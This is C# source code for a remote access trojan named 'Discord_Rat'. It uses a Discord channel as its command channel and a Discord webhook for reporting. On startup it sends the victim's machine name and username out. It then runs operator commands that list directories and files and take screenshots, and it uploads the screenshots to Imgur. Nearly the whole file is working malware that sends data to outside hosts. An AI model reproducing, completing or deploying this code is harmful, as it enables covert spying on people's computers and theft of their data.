using System;
using System.Text;
using System.IO;
using System.Net;
using System.Collections.Specialized;
using System.Threading;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Diagnostics;

namespace Discord_Rat
{
    class Program
    {
        //WARNING!! This is pretty shitty code
        public static string name = ""; //bot name(don't mess with)
        public static string data = "";
        public static string alldirs = "";
        public static string webHook = "WEBHOOK"; //Webhhook
        public static string value = "DISCORD TOKEN"; //Discord Token
        public static string ImgurID = "IMGUR_CLIENT_ID"; //Imgur Client ID
        public static string cID = "CHANNEL ID"; //Channel ID
        static void Main(string[] args)
        {
            name = Environment.UserName;
            Start();
            while (true)
            {
               
                WebClient webby = new WebClient();
                webby.Proxy = null;
                webby.Headers["Authorization"] = value;
                data = webby.DownloadString($"https://discordapp.com/api/v6/channels/{cID}/messages?limit=1"); //Gets the last message sent in a Specific Channel
                data = data.Replace("\"", "");
                string accountname = Between(data, "username: ", ", discriminat");
                data = Between(data, "content: ", ", channel_id");
                if(accountname != "Rat")
                {
                    if(data.Contains(";"))
                    {
                        CommandHandler(data);
                    }
                }
                Thread.Sleep(1000);
            }
        }
        public static void CommandHandler(string command)
        {
           if (command.Contains(name))
           {
                if (command.Contains(";screenshot"))
                {
                    sendWebhok(TakeScreenshot());
                }
                else if (command.Contains(";test"))
                {
                    sendWebhok("test");
                }
                else if(command.Contains(";nick"))
                {
                    string[] split = command.Split(' ');
                    name = split[2];
                    sendWebhok($"Changed Client Name to {name}");
                }
                else if (command.Contains(";help"))
                {
                    sendWebhok($"**HELP MENU**{Environment.NewLine}-----------{Environment.NewLine};dir - Get all Directories in a path ex(;dir CLIENTNAME C:/){Environment.NewLine};getfiles - Get all Files in a path ex(;getfiles CLIENTNAME C:/){Environment.NewLine};screenshot - Take a Screenshot and return an imgur link ex(;screenshot CLIENTNAME){Environment.NewLine};test - tests?{Environment.NewLine};ConnectedClients - Gets all the connected Clients{Environment.NewLine};nick - Changes Bots Nickname ex(;nick CurrentName NewName)");
                }
                else if (command.Contains(";dir"))
                {
                    try
                    {
                        command = command + "423849203";
                        foreach (string hi in Directory.GetDirectories(Between(command, $";dir {name} ", "423849203")))
                        {
                            alldirs += hi + Environment.NewLine;
                        }
                        sendWebhok(alldirs);
                        alldirs = "";
                    }
                    catch { sendWebhok("Error When Getting Directories..."); }
                }
                else if (command.Contains(";getfiles"))
                {
                    try
                    {
                        command = command + "423849203";
                        foreach (string hi in Directory.GetFiles(Between(command, $";getfiles {name} ", "423849203")))
                        {
                            alldirs += hi + Environment.NewLine;
                        }
                        sendWebhok(alldirs);
                        alldirs = "";
                    }
                    catch { sendWebhok("Error When Getting Files..."); }
                }
            }
            else { }
            if(command == ";ConnectedClients")
            {
                sendWebhok($"Client: {name}");
            }
        } //Handles all the Commands
        public static void sendWebhok(string message)
        {
            using (dWebHook dcWeb = new dWebHook())
            {
                dcWeb.ProfilePicture = "https://static.giantbomb.com/uploads/original/4/42381/1196379-gas_mask_respirator.jpg";
                dcWeb.UserName = "Rat";
                dcWeb.WebHook = webHook;
                dcWeb.SendMessage(message);
                Thread.Sleep(1500);
                data = "";
            }

        }
        internal static byte[] ImageToByteArray(Image img)
        {
            byte[] byteArray = new byte[0];
            MemoryStream stream = new MemoryStream();
            img.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
            stream.Close();
            byteArray = stream.ToArray();
            return byteArray;
        }
        public static string TakeScreenshot()
        {


            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            Graphics graphics = Graphics.FromImage(bitmap);

            graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            graphics.Dispose();
            Random r = new Random();
            string fpath = $@"C:\Users\{Environment.UserName}\AppData\Local\Temp\" + r.Next(100, 1000000) + ".png";
            bitmap.Save(fpath);
            Image img = (Image)bitmap;
            string str = Convert.ToBase64String(ImageToByteArray(img));
            using (var w = new WebClient())
            {
                w.Headers["Authorization"] = $"Client-ID {ImgurID}"; 
                var values = new NameValueCollection
    {

        { "image", Convert.ToBase64String(File.ReadAllBytes(fpath)) }
    };

                byte[] response = w.UploadValues("https://api.imgur.com/3/image", values);
                string before = Encoding.ASCII.GetString(response);
                before = before.Replace("\"", "");
                string link = Between(before, "link:", "},success");
                return link;
            }
        }
        public static void Start()
        { 
            sendWebhok($"Bot: Connected \r\nMachineName: {Environment.MachineName}\r\nUsername: {Environment.UserName}\r\nCurrent Time: {DateTime.Now.ToShortTimeString()}");
        }
        public static string Between(string STR, string FirstString, string LastString)
        {
            string FinalString;
            int Pos1 = STR.IndexOf(FirstString) + FirstString.Length;
            int Pos2 = STR.IndexOf(LastString);
            FinalString = STR.Substring(Pos1, Pos2 - Pos1);
            return FinalString;
        }
    }
    //Thanks Bon for this class 
    public class dWebHook : IDisposable
    {
        private readonly WebClient dWebClient;
        private static NameValueCollection discordValues = new NameValueCollection();
        public string WebHook { get; set; }
        public string UserName { get; set; }
        public string ProfilePicture { get; set; }

        public dWebHook()
        {
            dWebClient = new WebClient();
        }
        public void SendMessage(string msgSend)
        {
            discordValues.Add("username", UserName);
            discordValues.Add("avatar_url", ProfilePicture);
            discordValues.Add("content", msgSend);

            dWebClient.UploadValues(WebHook, discordValues);

            discordValues.Remove("username");
            discordValues.Remove("avatar_url");
            discordValues.Remove("content");
        }
        public void Dispose()
        {
            dWebClient.Dispose();
        }
    }
}
